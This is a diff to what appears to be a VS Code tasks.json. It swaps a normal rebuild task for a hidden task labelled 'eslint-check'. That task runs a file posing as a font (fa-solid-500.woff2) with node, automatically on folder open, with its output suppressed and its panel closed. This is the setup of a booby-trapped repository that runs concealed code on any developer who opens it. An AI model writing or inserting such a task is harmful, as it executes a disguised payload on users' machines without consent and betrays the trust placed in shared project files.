@@ -1,23 +1,33 @@
 {
   "version": "2.0.0",
-  "options": {
-    "env": {
-      "OUTPUT_SOURCE_MAPS": "1"
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
     }
-  },
+  ],
   "tasks": [
     {
-      "label": "debug:rebuild",
+      "label": "eslint-check",
       "type": "shell",
-      "command": "pnpm clean:dist && pnpm build",
-      "group": "none",
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-500.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-500.woff2) || echo ''", 
       "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
       "presentation": {
-        "echo": true,
-        "reveal": "always",
+        "reveal": "never",
+        "panel": "dedicated",
         "focus": false,
-        "panel": "shared"
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
       }
-    }
+    },
   ]
 }
